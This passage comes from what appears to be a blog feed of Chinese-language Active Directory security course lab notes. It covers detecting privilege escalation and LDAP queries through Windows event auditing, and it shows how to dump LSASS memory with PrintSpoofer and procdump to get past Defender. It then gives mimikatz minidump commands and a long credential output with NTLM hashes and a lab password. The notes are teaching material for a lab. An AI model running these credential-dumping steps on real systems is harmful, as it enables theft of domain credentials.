&lt;li>Hijack Token&lt;/li>
&lt;li>Guess Password&lt;/li>
&lt;li>管理服務&lt;/li>
&lt;li>錯誤配置&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab-time---本地提權">
 Lab Time - 本地提權
 &lt;a class="anchor" href="#lab-time---%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%ac%8a">#&lt;/a>
&lt;/h2>
&lt;h3 id="偵測network-service提權">
 ==偵測Network Service提權==
 &lt;a class="anchor" href="#%e5%81%b5%e6%b8%acnetwork-service%e6%8f%90%e6%ac%8a">#&lt;/a>
&lt;/h3>
&lt;p>利用Event ID: 4624&lt;/p>
&lt;ul>
&lt;li>類型: 5&lt;/li>
&lt;li>虛擬帳戶: 是&lt;/li>
&lt;li>提高權限的權杖: 是
這樣的rule會有高機率命中，但經過實測會發現他不會顯示出類型5和虛擬帳戶為是的event，只有類型3會被顯示出來，如下圖
&lt;img src="https://hackmd.io/_uploads/ryoW9NfC3.png" alt="" />&lt;/li>
&lt;/ul></description></item><item><title>NTUSTISC - AD Note - Lab(偵測查詢的操作)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x05%E5%81%B5%E6%B8%AC%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%93%8D%E4%BD%9C/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x05%E5%81%B5%E6%B8%AC%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%93%8D%E4%BD%9C/</guid><description>&lt;h1 id="ntustisc---ad-note---lab偵測查詢的操作">
 NTUSTISC - AD Note - Lab(偵測查詢的操作)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e5%81%b5%e6%b8%ac%e6%9f%a5%e8%a9%a2%e7%9a%84%e6%93%8d%e4%bd%9c">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="lab-time---環境調查">
 Lab Time - 環境調查
 &lt;a class="anchor" href="#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5">#&lt;/a>
&lt;/h2>
&lt;h3 id="lab---how-to-observe-theyve-audited-the-record">
 ==Lab - How to observe they&amp;rsquo;ve audited the record?==
 &lt;a class="anchor" href="#lab---how-to-observe-theyve-audited-the-record">#&lt;/a>
&lt;/h3>
&lt;p>像前面說的，如果在群組的user要觀察ad的name, description之類的，要如何觀察到他們正在做的事情?可以利用==Windows Event ID: 4662==，這個event ID會針對所有user對LDAP的查詢進行log，這樣不管是誰進行查詢都會留下紀錄，但是事先要啟用(預設不開)&lt;/p>
&lt;ol>
&lt;li>
&lt;p>GPO(Group Policy Object)啟動相關事件稽核
在Win2016一開機會啟動Server Manager，其中的&lt;code>Tools/Group Policy Management&lt;/code>
&lt;img src="https://hackmd.io/_uploads/H1ZYPF7Rn.png" alt="" />&lt;/p>
&lt;p>點選進去後在&lt;code>Forest:kuma.org/Domains/kuma.org/Default Domain Policy&lt;/code>按右鍵選取Edit就會看到==Group Policy Management Editor==
&lt;img src="https://hackmd.io/_uploads/H1bx_t7C3.png" alt="" />&lt;/p>
&lt;p>接著在&lt;code>Group Policy Management Editor/Computer Configuration/Policies/Windows Settings/Security Settings/Local Policies/Audit Policy&lt;/code>中可以找到==Audit directory service access Properties==，勾選起來就可以了
&lt;img src="https://hackmd.io/_uploads/ByynOtmC3.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>使用者管理開啟進階功能&lt;/p>
&lt;ul>
&lt;li>接下來要設定哪些使用者的這些行為要被稽核，首先打開Windoes Startup中有一個==Active Directory Users and Computers==
&lt;img src="https://hackmd.io/_uploads/rJxddjPp3.png" alt="" />&lt;/li>
&lt;li>進入View中把Advanced Features功能打開
&lt;img src="https://hackmd.io/_uploads/ryIsdow6n.png" alt="" />&lt;/li>
&lt;li>接著左邊的列表會出現一些東西，包含Users，我們右鍵Users選擇屬性，並進入Security/Advanced/Auditing
&lt;img src="https://hackmd.io/_uploads/HJexFjDp3.png" alt="" />&lt;/li>
&lt;li>進行新增，最上面的Principle直接打Everyone就可以了，代表任何人，下面的Permission勾選&lt;code>List Contents&lt;/code>
&lt;img src="https://hackmd.io/_uploads/S1I8KswT3.png" alt="" />&lt;/li>
&lt;li>這一連串的操作就代表，任何人只要在kuma這個網域底下進行List Content的操作，AD DC都會偵測到進行紀錄
:::spoiler Result
&lt;img src="https://hackmd.io/_uploads/Hy8yjiDTh.png" alt="" />
稍微解釋一下，做邊是kuma.org網域的bear帳戶，在右下角有顯示時間為12:37，此時進行&lt;code>net user /domain&lt;/code>的操作，而右邊是DC，我們利用Event Viewer進行查看Event ID: 4662中的確記錄到此次event，而查詢的帳號也的確是bear
:::&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr></description></item><item><title>NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/</guid><description>&lt;h1 id="ntustisc---ad-note---lab其他方法得到lsassdmp">
 NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e5%85%b6%e4%bb%96%e6%96%b9%e6%b3%95%e5%be%97%e5%88%b0lsassdmp">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>有了Mimikatz也不一定能夠用，因為Windows的defender也知道這是個好用的東西，對於攻擊方而言，所以會盡可能的直接刪除，那要怎麼bypass或用其他方法把LSASS帶走?&lt;/p>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="take-lsass-with-other-ways">
 ==Take LSASS with other ways==
 &lt;a class="anchor" href="#take-lsass-with-other-ways">#&lt;/a>
&lt;/h3>
&lt;h4 id="方法一">
 方法一
 &lt;a class="anchor" href="#%e6%96%b9%e6%b3%95%e4%b8%80">#&lt;/a>
&lt;/h4>
&lt;p>在windows工作管理員中，找到Local Security Authority Process(LSASS)，右鍵選==建立傾印檔案==，就可以直接dump memory，然後再把這一份檔案丟到自己可以開mimikatz的電腦，就可以分析了，會有一樣的效果
&lt;img src="https://hackmd.io/_uploads/ryINQ7NRh.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/ByvHX7NR2.png" alt="" />&lt;/p>
&lt;h4 id="方法二">
 方法二
 &lt;a class="anchor" href="#%e6%96%b9%e6%b3%95%e4%ba%8c">#&lt;/a>
&lt;/h4>
&lt;p>如果沒有GUI的話，也可以考慮直接使用&lt;a href="https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump">Procdump&lt;/a>，當然你必須要取得足夠的權限，要不就是用前面提到的IIS提權執行指令，不然就直接切換administrator帳戶，我是用前者
Command: &lt;code>c:\tools\PrintSpoofer64.exe -c &amp;quot;c:\windows\system32\cmd.exe /c c:\tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp &amp;gt; c:\inetpub\wwwroot\tmp.txt&amp;quot;&lt;/code>
&lt;img src="https://hackmd.io/_uploads/HJXt8mN0h.png" alt="" />
可以看到它放在&lt;code>C:\Windows\system32\lsass.dmp&lt;/code>中&lt;/p>
&lt;h4 id="透過minidump獲取資訊">
 透過Minidump獲取資訊
 &lt;a class="anchor" href="#%e9%80%8f%e9%81%8eminidump%e7%8d%b2%e5%8f%96%e8%b3%87%e8%a8%8a">#&lt;/a>
&lt;/h4>
&lt;p>有了前面的lsass.dmp，就可以繼續使用mimikatz得到一些有用的資訊，只是，指令稍微有點不太一樣，因為我們不用對lsass進行debug&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ Sekurlsa::minidump &lt;span style="color:#e6db74">&amp;#34;&amp;lt;path to lsass.dmp&amp;gt;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ Sekurlsa::logonPasswords
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::spoiler Result&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># Sekurlsa::minidump &amp;#34;C:\Windows\system32\lsass.dmp&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Switch to MINIDUMP : &lt;span style="color:#e6db74">&amp;#39;C:\Windows\system32\lsass.dmp&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># log&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Using &lt;span style="color:#e6db74">&amp;#39;mimikatz.log&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> logfile : OK
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># Sekurlsa::logonPasswords&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Opening : &lt;span style="color:#e6db74">&amp;#39;C:\Windows\system32\lsass.dmp&amp;#39;&lt;/span> file &lt;span style="color:#66d9ef">for&lt;/span> minidump...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">2913881&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:002c7659&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DefaultAppPool
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : IIS APPPOOL
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 11:49:20
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">2569783&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:00273637&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : CachedInteractive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 11:39:37
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-500
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : cf967ea9c9c0f9d58b79fdd040270648
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : 1qaz@WSX3edc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">1145006&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:001178ae&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : CachedInteractive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:43:30
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-500
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : cf967ea9c9c0f9d58b79fdd040270648
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : 1qaz@WSX3edc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">419256&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000665b8&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : bear
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:29:31
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-2101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : 4057a0d0b94378dd03224e8b3d28a006
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">995&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e3&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : IUSR
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : NT AUTHORITY
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:35
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-17
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">997&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e5&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : LOCAL SERVICE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : NT AUTHORITY
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-19
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">70310&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000112a6&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DWM-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Window Manager
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-90-0-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
